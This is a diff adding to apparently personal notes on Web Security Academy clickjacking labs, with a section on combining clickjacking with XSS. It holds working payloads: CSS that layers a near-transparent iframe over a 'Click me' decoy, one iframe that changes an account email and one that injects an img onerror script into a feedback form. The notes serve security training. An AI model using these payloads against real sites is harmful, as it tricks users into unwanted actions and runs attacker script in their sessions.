@@ -115,3 +115,33 @@ sandbox typically blocks js of the example.com to run when we load the page and 
 <div>Click me</div>
 <iframe src="https://0af500cd04b01a8680733a0800ec0027.web-security-academy.net/my-account?email=hacker111@attacker-website.com"  sandbox="allow-forms"></iframe>
 ```
+
+
+## Combining Clickjacking and XSS
+
+The URL loaded inside the iframe contains a maliciously crafted parameter that exploits a DOM XSS vulnerability on that target page.
+
+## LAB-4
+
+xss vulnerability is present in the feedback form, in the ```name``` field.parameter value of the name field is ```name``` itself.
+
+***Payload***
+```
+<style>
+    iframe {
+        position:absolute;
+        width:1000px;
+        height: 1000px;
+        opacity:0.1;
+        z-index: 2;
+    }
+    div {
+        position:absolute;
+        top:810px;
+        left:80px;
+        z-index: 1;
+    }
+</style>
+<div>Click me</div>
+<iframe src="https://0a44005604fb15528036670c008a00a3.web-security-academy.net/feedback?name=<img src=x onerror=print(1)> &email=od@gmail.com&subject=hello&message=zxcvb" ></iframe>
+```
